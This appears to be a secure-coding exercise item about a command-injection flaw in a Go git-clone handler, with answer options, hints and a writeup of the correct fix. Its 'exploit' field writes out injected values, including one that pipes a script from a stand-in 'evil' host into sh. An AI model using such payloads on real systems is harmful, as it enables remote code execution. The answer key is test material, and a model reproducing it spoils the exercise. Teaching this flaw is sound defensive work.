files.name: git.go

notes.6: Clones a repository whose URL comes from the user.
notes.7: Runs `git clone` via `sh -c`, concatenating `repo` into the shell command string.

options.label: `git clone` is slow for large repos, blocking the handler
options.whyWrong: Latency isn't the issue; the shell interpreting `repo` is.

options.label: `cmd.Run()` doesn't capture output, hiding errors
options.whyWrong: Output handling is unrelated to the injection.

options.label: `sh -c` runs a shell and `repo` is concatenated in, so shell metacharacters in it execute as commands
Wrap repo in quotes in the command
options.diff:
-	cmd := exec.Command("sh", "-c", "git clone "+repo)
+	cmd := exec.Command("sh", "-c", "git clone '"+repo+"'")
options.whyWrong: A quote in `repo` breaks out, and `$()`/backticks still execute inside the shell.

options.label: Call exec.Command("git", "clone", repo) with no shell
options.diff:
-	cmd := exec.Command("sh", "-c", "git clone "+repo)
+	cmd := exec.Command("git", "clone", repo)

options.label: Check that repo starts with https://
options.whyWrong: `https://x$(id)` passes a prefix check and still injects via the shell.

training.exploit: Pass `repo = "https://x; curl http://evil/s | sh"` or `repo = "$(id)"`. The shell runs `git clone https://x`, then the injected command. Dropping `sh -c` and invoking git directly removes the shell entirely.

hints.line: Which call sends a built string to a shell?
hints.bugClass: The input reaches the OS shell.
hints.fix: Invoke the binary directly with argument slices.

writeup.summary: `exec.Command("sh", "-c", "git clone "+repo)` runs a shell and concatenates `repo` into the command, so metacharacters execute. Calling `exec.Command("git", "clone", repo)` runs git directly with `repo` as a single argument — Go doesn't invoke a shell, so there is nothing to interpret `;`, `$()`, or backticks. Quoting and prefix checks are bypassable.
